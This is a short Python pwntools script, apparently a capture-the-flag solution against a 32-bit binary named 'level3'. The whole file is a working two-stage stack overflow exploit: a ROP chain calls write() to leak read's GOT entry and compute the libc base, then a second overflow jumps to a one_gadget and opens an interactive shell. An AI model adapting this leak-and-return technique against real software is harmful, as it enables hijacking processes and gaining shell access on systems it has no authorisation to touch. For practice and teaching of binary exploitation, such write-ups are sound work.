# coding:UTF-8
# author:iopr
# leak libc_version to get libc and one_gadget -> to call one_gadget finally

from pwn import *
context(os='linux',arch='i386')

Debug=1
if Debug:
    io=process('./level3')
else:
    pass

one_gadget=0x3ac5c
buf=0xBFF847D0
ret=0xBFF8485C
elf=ELF('./level3')
libc=ELF('./libc.so.6')
start=0x08048350
def main():
    io.recvuntil('Input:\n')
    io.sendline((ret-buf)*'a'+p32(elf.plt['write'])+p32(start)+p32(1)+p32(elf.got['read'])+p32(4))
    elf_got_read=u32(io.recv(4))
    libc_addr=elf_got_read-libc.symbols['read']
    io.recvuntil('Input:\n')
    io.sendline((ret-buf)*'a'+p32(libc_addr+one_gadget))
    io.interactive()

main()